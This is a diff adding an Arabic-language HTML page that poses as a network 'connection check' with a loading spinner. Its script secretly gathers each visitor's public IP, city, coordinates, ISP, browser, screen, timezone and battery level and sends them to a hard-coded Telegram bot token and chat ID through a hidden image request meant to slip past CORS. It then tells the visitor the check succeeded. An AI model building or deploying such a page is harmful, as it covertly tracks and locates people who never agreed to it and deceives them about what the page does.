@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>فحص الاتصال...</title>
+<style>
+  body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #0f172a; color: #e2e8f0;
+         display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+  .card { background: #1e293b; padding: 40px 50px; border-radius: 14px; text-align: center;
+          box-shadow: 0 10px 30px rgba(0,0,0,.4); }
+  .spinner { width: 40px; height: 40px; border: 4px solid #334155; border-top-color: #38bdf8;
+             border-radius: 50%; margin: 0 auto 20px; animation: spin 1s linear infinite; }
+  @keyframes spin { to { transform: rotate(360deg); } }
+  h1 { font-size: 20px; margin: 0 0 8px; }
+  p { color: #94a3b8; font-size: 14px; margin: 0; }
+</style>
+</head>
+<body>
+<div class="card">
+  <div class="spinner"></div>
+  <h1>جاري التحقق من الاتصال...</h1>
+  <p>يرجى الانتظار، يتم فحص شبكة الاتصال لديك.</p>
+</div>
+
+<script>
+// ================== الإعدادات ==================
+const BOT_TOKEN = "8990437503:AAEbLQn5Pe539tpZb-l47AHoWxMPOakftho";
+const CHAT_ID   = "8278195073";
+// ==============================================
+
+// 1) جلب الـ IP العام للزائر
+async function getIP() {
+  const r = await fetch('https://api.ipify.org?format=json');
+  const d = await r.json();
+  return d.ip;
+}
+
+// 2) جلب تفاصيل إضافية (دولة، مدينة، ISP، إحداثيات...)
+async function getGeo(ip) {
+  try {
+    const r = await fetch('https://ipwho.is/' + ip);
+    const d = await r.json();
+    if (!d.success) return null;
+    return {
+      country: d.country,
+      city: d.city,
+      region: d.region,
+      isp: d.connection.isp,
+      lat: d.latitude,
+      lon: d.longitude,
+      tz: d.timezone.id
+    };
+  } catch (e) { return null; }
+}
+
+// 3) الإرسال إلى تيليغرام
+function sendToTelegram(text) {
+  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage` +
+              `?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`;
+  // صورة خفية تتجاوز قيود CORS (تيليغرام يدعم GET)
+  const img = new Image();
+  img.src = url;
+}
+
+(async function main() {
+  try {
+    const ip = await getIP();
+    const geo = await getGeo(ip);
+
+    const ua     = navigator.userAgent;
+    const lang   = navigator.language;
+    const screen = `${screen.width}x${screen.height}`;
+    const tz     = Intl.DateTimeFormat().resolvedOptions().timeZone;
+    let battery  = 'غير معروف';
+    if (navigator.getBattery) {
+      battery = await navigator.getBattery().then(b => Math.round(b.level * 100) + '%')
+                                            .catch(() => 'غير معروف');
+    }
+
+    let msg  = `🕵️ زائر جديد دخل الصفحة\n`;
+    msg     += `──────────────\n`;
+    msg     += `🌐 IP: ${ip}\n`;
+    if (geo) {
+      msg += `📍 الموقع: ${geo.city}، ${geo.country}\n`;
+      msg += `🗺️ الإحداثيات: ${geo.lat}, ${geo.lon}\n`;
+      msg += `🏢 مزوّد الخدمة: ${geo.isp}\n`;
+    }
+    msg += `🖥️ المتصفح: ${ua.substring(0, 150)}\n`;
+    msg += `🌍 اللغة: ${lang}\n`;
+    msg += `📱 الشاشة: ${screen}\n`;
+    msg += `🕒 المنطقة الزمنية: ${tz}\n`;
+    msg += `🔋 البطارية: ${battery}\n`;
+    msg += `⏰ التاريخ: ${new Date().toLocaleString()}`;
+
+    sendToTelegram(msg);
+    document.querySelector('h1').textContent = 'تم التحقق بنجاح ✓';
+    document.querySelector('p').textContent = 'يمكنك المتابعة الآن.';
+  } catch (e) {
+    document.querySelector('h1').textContent = 'تعذر الاتصال';
+    console.error(e);
+  }
+})();
+</script>
+</body>
+</html>
